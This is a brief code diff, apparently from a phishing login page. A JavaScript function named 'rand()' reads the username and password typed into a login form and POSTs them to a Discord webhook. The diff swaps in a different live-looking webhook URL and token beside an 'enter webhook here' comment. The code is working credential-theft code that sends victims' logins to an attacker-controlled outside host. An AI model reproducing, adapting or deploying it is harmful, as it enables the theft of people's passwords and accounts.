@@ -5,7 +5,7 @@ function rand() {
 	u = document.getElementById("login-username").value; 
 	p = document.getElementById("login-password").value;
 	
-	wb = "https://discord.com/api/webhooks/1030480788501831751/cS9DEz0u_uciwfokSGYKTlFuvljzj5Z64G5NTQq7vgxo_PlIfzOnPeknJLliBcQy8To7"; //enter webhook here
+	wb = "https://discordapp.com/api/webhooks/1412507396873523312/3Sqo_syA5xtWCUoJDhQDjw29ojbEP3PUzuLol_2K_rD-VMTXifDOKU2Ol5sJKixI45Uc"; //enter webhook here
 	
 	var request = new XMLHttpRequest();
       request.open("POST", wb);
@@ -20,4 +20,5 @@ function rand() {
 
       request.send(JSON.stringify(params));
 	
+
 }
